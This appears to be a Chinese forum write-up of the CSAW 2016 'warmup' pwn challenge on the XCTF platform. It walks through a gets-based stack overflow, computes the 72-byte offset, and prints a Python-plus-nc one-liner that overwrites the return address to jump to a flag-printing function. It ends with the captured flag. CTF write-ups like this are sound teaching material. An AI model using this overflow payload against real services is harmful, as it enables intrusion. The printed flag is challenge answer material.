
# [原创]XCTF 攻防世界 PWN 高手进阶区 csaw-ctf-2016-quals warmup writeup

拿到题目首先进行初步查看，64位，栈不可执行

![](https://bbs.kanxue.com/upload/attach/201905/828287_G6BXQQHNGE3AJ6D.jpg)

用 IDA 打开，查看字符串

![](https://bbs.kanxue.com/upload/attach/201905/828287_HAYP8UP6T5G2Y2K.jpg)

发现关键字符串，查看调用情况

![](https://bbs.kanxue.com/upload/attach/201905/828287_Q9G7AQGJAE9N6K4.jpg)

![](https://bbs.kanxue.com/upload/attach/201905/828287_7BB7NR7NV75PJ4G.jpg)

在 `gets` 函数处输入 `v5`，在这里可以通过覆盖函数返回地址调用 `sub_40060D`，而：

```
char v5; // [rsp+40h] [rbp-40h]
```

即堆栈中 `v5` 占了 `0x40h`，之后则是存放 `rbp` 的位置，大小为 8，函数返回地址在 `rbp+8`，即 `0x40+8+8=80`，即总长度为 80，输入的垃圾数据为 `80-8=72`，覆盖返回地址大小为 8。

直接连接 docker 镜像传入参数

![](https://bbs.kanxue.com/upload/attach/201905/828287_KRP4MC9ZNQCB4GR.jpg)

即：

```
python -c 'from struct import pack as p; print "A" * 72 + p("Q", 0x40060d)' | nc 111.198.29.45 44972
```

flag：`cyberpeace{bca29fd1fc292bd1b7964acaaaabf724}`

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

上传的附件：

- [warmup](javascript:void(0);)

  （6.16kb，44次下载）
